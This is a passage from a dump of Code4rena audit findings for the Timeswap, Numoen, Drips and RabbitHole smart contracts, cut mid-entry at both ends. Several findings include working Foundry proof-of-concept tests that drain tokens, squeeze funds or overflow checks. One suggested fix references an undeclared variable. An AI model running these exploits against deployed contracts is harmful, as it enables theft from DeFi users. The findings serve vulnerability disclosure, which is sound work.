least significant addition. then we can simply break the overflow check by assigning an overflowing values which results in add(addendA1, addendB1) > type(256).max && addendA1 <= sum1, then we will manage to bypass the revert check and overflow the most significant part of add512 values.  the previous attack vector can lead to a manipulation in leverage and deleverage functions, in a way that it would result in more tokens for the user ## Proof of Concept inputing the following values result in an overflow: uint256 addendA0 = 1 uint256 addendA1 = 100 uint256 addendB0 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 (uint256 max value) uint256 addendB1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 (uint256 max value)  results in: sum0 = 0 sum1 = 100  the expected behavior is to revert since, A1 + B1 result in a value that overflows, but instead consider it as a valid behavior due to the insufficient checking.  Abstraction: A1 - A0                  + B1 - B0                 = S1 - S0  S0 = A0 + B0 S1 = A1 + B1 + ( if S0 overflows [+ 1]) ensure A1 <= S1 revert only on A1 > S1  in the case of S0 overflows: S1 = A1 + B1 + 1  require(A1 <= S1) is not most suited check, due to the fact that in the case of A1 == S1 check, it can still overflows if S1 = A1 + B1 + 1 overflows. which would bypass A1 > S1 revert check.  the major impact affects the leverage() and deleverage() result in values which are not expected.  ## Tools Used  ## Recommended Mitigation Steps  add a an equality check for if statement in add512 function.  ```    function add512(uint256 addendA0, uint256 addendA1, uint256 addendB0, uint256 addendB1) public pure returns (uint256 sum0, uint256 sum1) {         assembly {             sum0 := add(addendA0, addendB0)             carry  := lt(sum0, addendA0)             sum1 := add(add(addendA1, addendB1), carry)         }         if (addendA1 > sum1 ||      ((sum1 == addendA1 || sum1 == addendB1) && (carry < addendA0 || carry < addendB0)) ) revert AddOverflow(addendA0, addendA1, addendB0, addendB1); //      } ```"}, {"title": "`Mint` function does not update `LiquidityPosition` state of caller before minting LP tokens. This ", "html_url": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/158", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-01-timeswap-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L302 https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/LiquidityPosition.sol#L60   # Vulnerability details  ## Impact When a LP mints V2 Pool tokens, `mint` function in [PoolLibrary](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L302) gets called. Inside this function,  `updateDurationWeightBeforeMaturity` updates global `short`, `long0` and `long1` fee growth.   Change in global fee growth necessitates an update to `LiquidityPosition` state of caller (specifically updating fees & fee growth rates) when there are state changes made to that position (in this case, increasing liquidity). This principle is followed in functions such as `burn`, `transferLiquidity`, `transferFees`. However when calling `mint`, this update is missing. As a result, `growth` & `fee` levels in liquidity position of caller are inconsistent with global fee growth rates.   Inconsistent state leads to incorrect calculations of long0/long1 and short fees of LP holders which inturn can lead to loss of fees. Since this impacts actual rewards for users, I've marked it as MEDIUM risk  ## Proof of Concept  Let's say, Bob has following sequence of events  - MINT at T0: Bob is a LP who mints N pool tokens at T0  - MINT at T1: Bob mints another M pool tokens at T1. At this point, had the protocol correctly updated fees before minting new pool tokens, Bob's fees & growth rate would be a function of current liquidity (N), global updated short fee growth rate at t1 (s_t1) and Bob's previous growth rate at t_0 (b_t0)  - BURN at T2: Bob burns N + M tokens at T2. At this point, Bob's fees should be a function of previous liquidity (N+M), global short fee growth rate (s_t2) and Bob's previous growth rate at t_1(b_t1) -> since this update never happened, Bob's previous growth rate is wrongly referenced b_t0 instead of b_t1.   Bob could collect a lower fees because of this state inconsistency  ## Tools Used  ## Recommended Mitigation Steps Update the liquidity position state right before minting.  After [line 302 of Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L302), update the LiquidityPosition by adding  ```   liquidityPosition.update(pool.long0FeeGrowth, pool.long1FeeGrowth, pool.shortFeeGrowth); ```"}, {"title": "The collect() function will always TRANSFER ZERO fees, losing _feesPositions without receiving fees!", "html_url": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/121", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-03"], "target": "2023-01-timeswap-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L193   # Vulnerability details  ## Impact Detailed description of the impact of this finding. The ``collect()`` function will always transfer ZERO fees. At the same time, non-zero ``_fessPosition`` will be burned.  ``` _feesPositions[id][msg.sender].burn(long0Fees, long1Fees, shortFees); ``` As a result, the contracts will be left in an inconsistent state. The user will burn ``_feesPositions`` without receiving the the  fees!  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept. The ``collect()`` function will always transfer ZERO fees   in the following line:  ```  // transfer the fees amount to the recipient         ITimeswapV2Pool(poolPair).transferFees(param.strike, param.maturity, param.to, long0Fees, long1Fees, shortFees);  ``` This is because, at this moment, the values of  ``long0Fees``, ``long1Fees``, ``shortFees`` have not been calculated yet, actually, they will be equal to zero. Therefore, no fees will be transferred. The values of  ``long0Fees``, ``long1Fees``, ``shortFees`` are calculated afterwards by the following line: ``` (long0Fees, long1Fees, shortFees) = _feesPositions[id][msg.sender].getFees(param.long0FeesDesired, param.long1FeesDesired, param.shortFeesDesired);  ``` Therefore, ``ITimeswapV2Pool(poolPair).transferFees`` must be called after this line to be correct.   ## Tools Used Remix  ## Recommended Mitigation Steps We moved the line  ``ITimeswapV2Pool(poolPair).transferFees`` after ``long0Fees``, ``long1Fees``, ``shortFees`` have been calculated first.   ``` function collect(TimeswapV2LiquidityTokenCollectParam calldata param) external returns (uint256 long0Fees, uint256 long1Fees, uint256 shortFees, bytes memory data) {         ParamLibrary.check(param);          bytes32 key = TimeswapV2LiquidityTokenPosition({token0: param.token0, token1: param.token1, strike: param.strike, maturity: param.maturity}).toKey();          // start the reentrancy guard         raiseGuard(key);          (, address poolPair) = PoolFactoryLibrary.getWithCheck(optionFactory, poolFactory, param.token0, param.token1);           uint256 id = _timeswapV2LiquidityTokenPositionIds[key];          _updateFeesPositions(msg.sender, address(0), id);          (long0Fees, long1Fees, shortFees) = _feesPositions[id][msg.sender].getFees(param.long0FeesDesired, param.long1FeesDesired, param.shortFeesDesired);          if (param.data.length != 0)             data = ITimeswapV2LiquidityTokenCollectCallback(msg.sender).timeswapV2LiquidityTokenCollectCallback(                 TimeswapV2LiquidityTokenCollectCallbackParam({                     token0: param.token0,                     token1: param.token1,                     strike: param.strike,                     maturity: param.maturity,                     long0Fees: long0Fees,                     long1Fees: long1Fees,                     shortFees: shortFees,                     data: param.data                 })             );                  // transfer the fees amount to the recipient         ITimeswapV2Pool(poolPair).transferFees(param.strike, param.maturity, param.to, long0Fees, long1Fees, shortFees);           // burn the desired fees from the fees position         _feesPositions[id][msg.sender].burn(long0Fees, long1Fees, shortFees);          if (long0Fees != 0 || long1Fees != 0 || shortFees != 0) _removeTokenEnumeration(msg.sender, address(0), id, 0);          // stop the reentrancy guard         lowerGuard(key);     } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-numoen-findings/issues/276", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-01"], "target": "2023-01-numoen-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-numoen-findings/blob/main/data/Deivitto-G.md)."}, {"title": "Precision loss in the invariant function can lead to loss of funds", "html_url": "https://github.com/code-423n4/2023-01-numoen-findings/issues/264", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-01-numoen-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Pair.sol#L56   # Vulnerability details  ## Impact An attacker can steal the funds without affecting the invariant.  ## Proof of Concept We can say the function `Pair.invariant()` is the heart of the protocol. All the malicious trades should be prevented by this function. ```solidity Pair.sol 52:   /// @inheritdoc IPair 53:   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) { 54:     if (liquidity == 0) return (amount0 == 0 && amount1 == 0); 55: 56:     uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;//@audit-info precison loss 57:     uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;//@audit-info precison loss 58: 59:     if (scale1 > 2 * upperBound) revert InvariantError(); 60: 61:     uint256 a = scale0 * 1e18; 62:     uint256 b = scale1 * upperBound; 63:     uint256 c = (scale1 * scale1) / 4; 64:     uint256 d = upperBound * upperBound; 65: 66:     return a + b >= c + d; 67:   }  ``` The problem is there is a precision loss in the L56 and L57. The precision loss can result in the wrong invariant check result. Let's say the `token0` has 6 decimals and liquidity has more than 24 decimals. Then the first `FullMath.mulDiv` will cause significant rounding before it's converted to D18. To clarify the difference I wrote a custom function `invariant()` to see the actual value of `a+b-c-d`. ```   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity, uint256 token0Scale, uint256 token1Scale) public view returns (uint256 res) {     if (liquidity == 0) {         require (amount0 == 0 && amount1 == 0);         return 0;     }      // uint256 scale0 = FullMath.mulDiv(amount0* token0Scale, 1e18, liquidity) ;     // uint256 scale1 = FullMath.mulDiv(amount1* token1Scale, 1e18, liquidity) ;     uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;     uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;      if (scale1 > 2 * upperBound) revert();      uint256 a = scale0 * 1e18;     uint256 b = scale1 * upperBound;     uint256 c = (scale1 * scale1) / 4;     uint256 d = upperBound * upperBound;      res = a + b - c - d;   }    function testAudit1() external   {     uint256 x = 1*10**6;     uint256 y = 2 * (5 * 10**24 - 10**21);     uint256 liquidity = 10**24;     uint256 token0Scale=10**12;     uint256 token1Scale=1;     emit log_named_decimal_uint(\"invariant\", invariant(x, y, liquidity, token0Scale, token1Scale), 36);      x = 1.5*10**6;     emit log_named_decimal_uint(\"invariant\", invariant(x, y, liquidity, token0Scale, token1Scale), 36);   } ``` Put these two functions in the `LiquidityManagerTest.t.sol` and run the case. The result is as below and it shows that while the reserve0 amount changes to 150%, the actual value `a+b-c-d` does not change.  ``` F:\\SOL\\Code\\Code4rena\\2023-01-numoen>forge test -vv --match-test testAudit1 [\u2812] Compiling... No files changed, compilation skipped  Running 1 test for test/LiquidityManagerTest.t.sol:LiquidityManagerTest [PASS] testAudit1() (gas: 10361) Logs:   invariant: 0.000000000000000000000000000000000000   invariant: 0.000000000000000000000000000000000000  Test result: ok. 1 passed; 0 failed; finished in 5.74ms ```  So what does this mean? We know that if `a+b-c-d` is positive, it means anyone can call `swap()` to withdraw the excess value. The above test shows that the significant change in the token0 reserve amount did not change the value `a+b-c-d`. Based on this, I wrote an attack case where dennis pulls 0.5*10**6 token0 without cost while the invariant stays at zero. Although the benefit is only 0.5 USDC for this test case, this shows a possibility drawing value without affecting the invariant for pools with low decimals.  ```solidity   function testAttack() external   {     // token0 is USDC     token0Scale = 6;     token1Scale = 18;      // cuh adds liquidity     lendgine = Lendgine(factory.createLendgine(address(token0), address(token1), token0Scale, token1Scale, upperBound));      uint256 amount0 = 1.5*10**6;     uint256 amount1 = 2 * (5 * 10**24 - 10**21);     uint256 liquidity = 10**24;      token0.mint(cuh, amount0);     token1.mint(cuh, amount1);      vm.startPrank(cuh);     token0.approve(address(liquidityManager), amount0);     token1.approve(address(liquidityManager), amount1);      liquidityManager.addLiquidity(       LiquidityManager.AddLiquidityParams({         token0: address(token0),         token1: address(token1),         token0Exp: token0Scale,         token1Exp: token1Scale,         upperBound: upperBound,         liquidity: liquidity,         amount0Min: amount0,         amount1Min: amount1,         sizeMin: 0,         recipient: cuh,         deadline: block.timestamp       })     );     vm.stopPrank();     showLendgineInfo();      // dennis starts with zero token     assertEq(token0.balanceOf(dennis), 0);      // dennis pulls 0.5 USDC free     lendgine.swap(       dennis,       5*10**5,       0,       abi.encode(         SwapCallbackData({token0: address(token0), token1: address(token1), amount0: 0, amount1: 0, payer: dennis})       )     );      showLendgineInfo();      // assert     assertEq(token0.balanceOf(dennis), 5*10**5);   } ``` ## Tools Used Foundry  ## Recommended Mitigation Steps Make sure to multiply first before division to prevent precision loss. ```solidity   /// @inheritdoc IPair   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {     if (liquidity == 0) return (amount0 == 0 && amount1 == 0);      uint256 scale0 = FullMath.mulDiv(amount0 * token0Scale, 1e18, liquidity) ;//@audit-info change here     uint256 scale1 = FullMath.mulDiv(amount1 * token1Scale, 1e18, liquidity) ;//@audit-info change here      if (scale1 > 2 * upperBound) revert InvariantError();      uint256 a = scale0 * 1e18;     uint256 b = scale1 * upperBound;     uint256 c = (scale1 * scale1) / 4;     uint256 d = upperBound * upperBound;      return a + b >= c + d;   }  ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-numoen-findings/issues/259", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-03"], "target": "2023-01-numoen-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-numoen-findings/blob/main/data/CodingNameKiki-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-numoen-findings/issues/205", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-04"], "target": "2023-01-numoen-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-numoen-findings/blob/main/data/IllIllI-Q.md)."}, {"title": "Division before multiplication incurs unnecessary precision loss", "html_url": "https://github.com/code-423n4/2023-01-numoen-findings/issues/45", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-01-numoen-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Pair.sol#L56 https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Pair.sol#L57 https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Lendgine.sol#L252   # Vulnerability details  ## Impact  Division before multipilication incurs uncessary precision loss  ## Proof of Concept  In the current codebase, FullMath.mulDiv is used, the function takes three parameter,   basically FullMath.mulDIv(a, b, c) means a * b / c  Then there are some operation which that incurs unnecessary precision loss because of division before multiplcation.  When accuring interest, the code belows:  ```solidity   /// @notice Helper function for accruing lendgine interest   function _accrueInterest() private {     if (totalSupply == 0 || totalLiquidityBorrowed == 0) {       lastUpdate = block.timestamp;       return;     }      uint256 timeElapsed = block.timestamp - lastUpdate;     if (timeElapsed == 0) return;      uint256 _totalLiquidityBorrowed = totalLiquidityBorrowed; // SLOAD     uint256 totalLiquiditySupplied = totalLiquidity + _totalLiquidityBorrowed; // SLOAD      uint256 borrowRate = getBorrowRate(_totalLiquidityBorrowed, totalLiquiditySupplied);      uint256 dilutionLPRequested = (FullMath.mulDiv(borrowRate, _totalLiquidityBorrowed, 1e18) * timeElapsed) / 365 days;     uint256 dilutionLP = dilutionLPRequested > _totalLiquidityBorrowed ? _totalLiquidityBorrowed : dilutionLPRequested;     uint256 dilutionSpeculative = convertLiquidityToCollateral(dilutionLP);      totalLiquidityBorrowed = _totalLiquidityBorrowed - dilutionLP;     rewardPerPositionStored += FullMath.mulDiv(dilutionSpeculative, 1e18, totalPositionSize);     lastUpdate = block.timestamp;      emit AccrueInterest(timeElapsed, dilutionSpeculative, dilutionLP);   } ```  note the line:  ```solidity  uint256 dilutionLPRequested = (FullMath.mulDiv(borrowRate, _totalLiquidityBorrowed, 1e18) * timeElapsed) / 365 days; ```  This basically equals to dilutionLPRequested = (borrowRate * totalLiquidityBorrowed / 1e18 * timeElapsed) / 365 days  the first part of division can greatly truncate the value borrowRate * totalLiquidityBorrowed / 1e18, the totalLiquidityBorrowed should normalized and scaled by token preciision when adding liqudiity instead of division by 1e18 here.  Same preicision loss happens when computng the invariant  ```solidity   /// @inheritdoc IPair   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {     if (liquidity == 0) return (amount0 == 0 && amount1 == 0);      uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;     uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale; ```  scale0 = (amount0 * 1e18 / liqudiity) * token0Scale scale1 = (amount1 * 1e18 / liqudiity) * token1Scale  whereas the amount0 and amount1 should be first be normalized by token0Scale and token1Scale and then divided by liquidity at last. If the liquidity is a larger number  amount0 * 1e18 / liqudiity is already truncated to 0.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the protocol avoid divison before multiplication and always perform division operation at last."}, {"title": "Drips that end after the current cycle but before its creation can allow users to profit from squeezing", "html_url": "https://github.com/code-423n4/2023-01-drips-findings/issues/315", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-01-drips-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L425-L430   # Vulnerability details  ## Impact By creating a drip that ends after the current cycle but before its creation time and immediately removing it, the sender doesn't have to put in any assets but the receiver can still squeeze this drip.  By setting a receiver that the sender controls, the sender can drain arbitrary asset from the contract.  ## Proof of Concept Let the cycle length be 10 seconds. By i-th second I mean the i-th second of the cycle. At the 5th second, sender creates a drip that starts at 0th second and lasts for 2 seconds. At the 6th second, sender removes this drip.  https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L569 Since the drip ends before it was created, the dripped amount is 0, so the sender can retrieve their full balance.  https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L425-L430 https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L490-L496 Now the receiver squeezes from this drip. SqueezeStartCap = _currCycleStart() = 0th second, squeezeEndCap = 6th second, so the receiver can still squeeze out the full amount even though the sender has withdrawn all of his balance.  Please add the following test to DripsHub.t.sol. It verifies that the sender has retrieved all of his assets but the receiver can still squeeze. ```     function customSetDrips(         uint256 forUser,         uint128 balanceFrom,         uint128 balanceTo,         DripsReceiver[] memory newReceivers     ) internal {         int128 balanceDelta = int128(balanceTo) - int128(balanceFrom);         DripsReceiver[] memory currReceivers = loadDrips(forUser);          vm.prank(driver);         int128 realBalanceDelta =             dripsHub.setDrips(forUser, erc20, currReceivers, balanceDelta, newReceivers, 0, 0);                  storeDrips(forUser, newReceivers);      }      function testExploitSqueeze() public {         skipToCycleEnd();         // Start dripping         DripsReceiver[] memory receivers = new DripsReceiver[](1);         receivers[0] = DripsReceiver(             receiver,             DripsConfigImpl.create(0, uint160(1 * dripsHub.AMT_PER_SEC_MULTIPLIER()), uint32(block.timestamp), 2)         );          DripsHistory[] memory history = new DripsHistory[](2);          uint256 balanceBefore = balance();         skip(5);         customSetDrips(user, 0, 2, receivers);         (,, uint32 lastUpdate,, uint32 maxEnd) = dripsHub.dripsState(user, erc20);         history[0] = DripsHistory(0, receivers, lastUpdate, maxEnd);          skip(1);         receivers = dripsReceivers();         customSetDrips(user, 2, 0, receivers);         (,, lastUpdate,, maxEnd) = dripsHub.dripsState(user, erc20);         history[1] = DripsHistory(0, receivers, lastUpdate, maxEnd);          assertBalance(balanceBefore);                  // Squeeze         vm.prank(driver);         uint128 amt = dripsHub.squeezeDrips(receiver, erc20, user, 0, history);         assertEq(amt, 2, \"Invalid squeezed amt\");     } ```  ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L426 One potential solution is to add an additional check after this line. Something along the lines of: `if (squeezeStartCap < drips.updateTime) squeezeStartCap = drips.updateTime;`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/676", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/matrix_0wl-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/675", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-02"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/SleepingBugs-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/669", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/rbserver-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/660", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-07"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/joestakey-Q.md)."}, {"title": "Users may mint receipts before Quest has started, if there is none or faulty off-chain validation", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/656", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-09"], "target": "2023-01-rabbithole-findings", "body": "# Lines of code  https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L219-L229   # Vulnerability details  A user mints a receipt (ERC721) in order to be able to claim their reward. As shown by the claim flowchart, the quest should be initially started before the user completes the on-chain tasks and mints a receipt. At the current moment within `mintReceipt` there is no modifier or check through the code that would revert if quest has not started at both the function level and at the start time.  ## Impact If there is sufficient validation by the rabbithole ECSDA hash endpoint to check off-chain by calling various view functions from the Quest Contract to establish whether the Quest has truly started then it will not be an issue. However, it may be good practice to implement this check within the contract. Hence why I have labelled as potentially a medium risk.  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept. Claim flowchart -> (https://user-images.githubusercontent.com/14314818/214354756-0af7e34d-746e-4429-8b55-8eb6d8bb1e31.png) https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L219-L229  ## Tools Used Manual Code Review, Visual Studio Code  ## Recommended Mitigation Steps Add modifier or if condition to revert if quest in question is has not started yet (at function level and based on start time)"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/654", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-10"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/lukris02-Q.md)."}, {"title": "Unlike `questFee_` , `royaltyFee_` is missing Upper Limit", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/651", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-01-rabbithole-findings", "body": "# Lines of code  https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L90-L93   # Vulnerability details  In the [QuestFactory.sol](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol) contract, as expected there is an upper limit on the `questFee_` so that no unjust amount is set for the `questFee_`  ``` 186-189:     function setQuestFee(uint256 questFee_) public onlyOwner {          if (questFee_ > 10_000) revert QuestFeeTooHigh();           questFee = questFee_;     } ```   However, in [RabbitHoleReceipt.sol](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol), the function `setRoyaltyFee()` does not set an upper limit to the `royaltyFee_` parameter. Thus any arbitrarily large values can be set for `royaltyFee_`  https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L90-L93  ``` 90-93: function setRoyaltyFee(uint256 royaltyFee_) public onlyOwner {         royaltyFee = royaltyFee_;         emit RoyaltyFeeSet(royaltyFee_);     } ```  setting large values of `royaltyFee_` will change all calculations in the contract wherever `royaltyFee_` is involved and very large sums of money will flow towards royalty fees. Royalty fee is meant to be a small amount, however here that is not the case.  #### Recommended Mitigation Steps  modify the `setRoyaltyFee()` function to set an upper limit to the `royaltyFee_` . A code similar to the following can be used  ``` function setRoyaltyFee(uint256 royaltyFee_) public onlyOwner {   if (royaltyFee_ > 1_000) revert RoyaltyFeeTooHigh();           royaltyFee = royaltyFee_;         emit RoyaltyFeeSet(royaltyFee_);     } ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/641", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-15"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/Josiah-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/619", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-17"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/CodingNameKiki-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/615", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-20"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/adriro-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/612", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-18"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/ddimitrov22-Q.md)."}, {"title": "Bad implementation in minter access control for `RabbitHoleReceipt` and `RabbitHoleTickets` contracts", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/608", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-01-rabbithole-findings", "body": "# Lines of code  https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61 https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50   # Vulnerability details  Both `RabbitHoleReceipt` and `RabbitHoleTickets` contracts define a `mint` function that is protected by a `onlyMinter` modifier:  RabbitHoleReceipt:  https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98-L104  ```solidity function mint(address to_, string memory questId_) public onlyMinter {     _tokenIds.increment();     uint newTokenID = _tokenIds.current();     questIdForTokenId[newTokenID] = questId_;     timestampForTokenId[newTokenID] = block.timestamp;     _safeMint(to_, newTokenID); } ```  RabbitHoleTickets:  https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83-L85  ```solidity function mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {     _mint(to_, id_, amount_, data_); } ```  However, in both cases the modifier implementation is flawed as there isn't any check for a require or revert, the comparison will silently return false and let the execution continue:  ```solidity modifier onlyMinter() {     msg.sender == minterAddress;     _; } ```  ## Impact  Any account can mint any number of `RabbitHoleReceipt` and `RabbitHoleTickets` tokens.  This represents a critical issue as receipts can be used to claim rewards in quests. An attacker can freely mint receipt tokens for any quest to steal all the rewards from it.  ## PoC  The following test demonstrates the issue.  ```solidity contract AuditTest is Test {     address deployer;     uint256 signerPrivateKey;     address signer;     address royaltyRecipient;     address minter;     address protocolFeeRecipient;      QuestFactory factory;     ReceiptRenderer receiptRenderer;     RabbitHoleReceipt receipt;     TicketRenderer ticketRenderer;     RabbitHoleTickets tickets;     ERC20 token;      function setUp() public {         deployer = makeAddr(\"deployer\");         signerPrivateKey = 0x123;         signer = vm.addr(signerPrivateKey);         vm.label(signer, \"signer\");         royaltyRecipient = makeAddr(\"royaltyRecipient\");         minter = makeAddr(\"minter\");         protocolFeeRecipient = makeAddr(\"protocolFeeRecipient\");          vm.startPrank(deployer);          // Receipt         receiptRenderer = new ReceiptRenderer();         RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();         receipt = RabbitHoleReceipt(             address(new ERC1967Proxy(address(receiptImpl), \"\"))         );         receipt.initialize(             address(receiptRenderer),             royaltyRecipient,             minter,             0         );          // factory         QuestFactory factoryImpl = new QuestFactory();         factory = QuestFactory(             address(new ERC1967Proxy(address(factoryImpl), \"\"))         );         factory.initialize(signer, address(receipt), 